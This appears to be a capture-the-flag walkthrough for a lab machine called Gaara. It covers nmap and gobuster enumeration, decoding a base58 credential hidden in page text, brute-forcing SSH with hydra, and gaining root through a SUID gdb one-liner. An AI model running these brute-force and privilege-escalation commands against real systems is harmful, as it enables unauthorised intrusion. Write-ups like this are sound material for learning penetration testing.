## Objectives
- user.txt flag
- proof.txt flag

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sV -sC -T4 192.168.107.142`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
```

<br>

### Gobuster Scan

`gobuster dir -u http://192.168.107.142 -t 100 -r -x php,txt,html -w dir-med.txt`

```
/index.html           (Status: 200) [Size: 137]
/Cryoserver           (Status: 200) [Size: 327]
```

<br>

## Website Digging

Visiting the main page:

Checking out **/Cryoserver** shows us what appears to be a blank page with nothing on it, but if you scroll down you'll see some text. You can also find this by **inspecting the page**:

**/Temari** explains the Gaara character with a page full of text:

**/Kazekage** and **/iamGaara** show the same thing, though on **iamGaara** it's slightly different with some spaces removed and other minor formatting changes.

I ran additional **gobuster** scans against all 3 of these locations and did not find anything new.

Not having much else to go on I decide to read the giant wall of text on the webpage starting with **/iamGaara** since it was slightly different from the other two. I eventually find this hidden in the text:

```
enraged Gaara f1MgN9mTf9SNbzRygcU into breaking Lee's arm and leg
```

Everything else are actual words so let's take a closer look at this string of characters. I run it through **cyberchef** and use the **magic formula**, which doesn't decode anything. I try some of the other basexx that the magic formula didn't try and it turns out to be **base58**:

```
gaara:ismyname
```

Looks like a username and password combo. I try and **SSH** over but the credentials did not work, so I guess we'll try brute forcing at this point. It finds the password for us after a couple of minutes:

`hydra -l gaara -P rockyou.txt 192.168.107.142 ssh`

```
[22][ssh] host: 192.168.107.142   login: gaara   password: <REDACTED>
```

<br>

## System Access

Having found the actual password I SSH over:

`ssh gaara@192.168.107.142`

```
gaara@192.168.107.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

```

<br>

## System Enumeration

Waiting for us in our home directory is a file called **local.txt** that gives us our first flag:

`wc -c local.txt`

```
33 local.txt
```

`sudo -l` doesn't allow us to run anything as root.

Looking in **/etc/passwd** shows us that the only user with a shell other than root is the one we're already on:

```
gaara:x:1001:1001:,,,:/home/gaara:/bin/bash
```

<br>

## Root

`find / -perm /4000 2>/dev/null` shows us that the **gdb** command has an **SUID** bit set on it, which is out of place. Checking [**GTFOBins**](https://gtfobins.github.io/gtfobins/gdb/#suid) shows us we can run the following to get root:

Running the command:

`gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`

Changing over to **/root** shows us our final flag **proof.txt**:

`wc -c /root/proof.txt`

```
33 proof.txt
```

<br>

With that we've completed this CTF!

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **nmap** and **gobuster**
- Manual investigation of a website to find **hidden base58 encoded text**
- **Decoding that hidden text** and finding a username on the system
- Searching for **SUID** files and seeing that **gdb** has it set, which allowed us to obtain **root**
